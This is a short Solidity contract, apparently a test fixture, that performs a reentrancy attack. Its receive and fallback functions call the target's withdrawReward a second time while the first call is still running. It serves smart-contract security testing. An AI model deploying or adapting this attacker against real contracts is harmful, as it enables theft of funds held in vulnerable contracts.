contract ReenteringAttacker {
    C public target;
    bool private _entered = false;
    constructor(address _target) {
        target = C(_target);
    }
    receive() external payable {
        if (!_entered) {
            _entered = true;
            target.withdrawReward(address(this));
        }
    }
    fallback() external payable {
        if (!_entered) {
            _entered = true;
            target.withdrawReward(address(this));
        }
    }
}

